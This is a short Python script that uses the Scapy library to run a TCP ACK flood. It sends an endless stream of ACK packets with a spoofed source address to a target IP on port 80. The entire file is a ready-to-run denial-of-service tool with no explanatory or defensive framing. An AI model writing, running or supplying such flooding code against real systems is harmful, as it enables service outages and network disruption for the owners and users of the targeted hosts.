from scapy.all import IP, TCP, RandIP, RandShort, send

target_ip = "192.168.1.1"
target_port = 80

def ack_flood(target_ip, target_port):
    src_ip = RandIP()
    src_port = RandShort()

    while True:
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="A")
        packet = ip/tcp

        send(packet, verbose=False)

ack_flood(target_ip, target_port)